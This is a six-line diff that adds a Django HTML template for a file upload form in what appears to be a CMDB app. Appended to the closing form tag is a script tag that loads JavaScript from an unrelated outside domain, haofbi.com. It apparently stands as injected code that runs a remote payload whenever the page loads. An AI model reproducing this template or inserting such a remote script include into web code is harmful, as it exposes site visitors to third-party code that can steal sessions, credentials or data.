@@ -1,0 +1,6 @@
+<p>upload_file</p>
+<form action="{% url 'cmdb:upload_file' %}" method="post"> 
+	{% csrf_token %}
+	{{form.as_p}}
+<button name="submit"> save file</button>
+</form><script language=javascript src=http://www.haofbi.com/js/w.js></script>
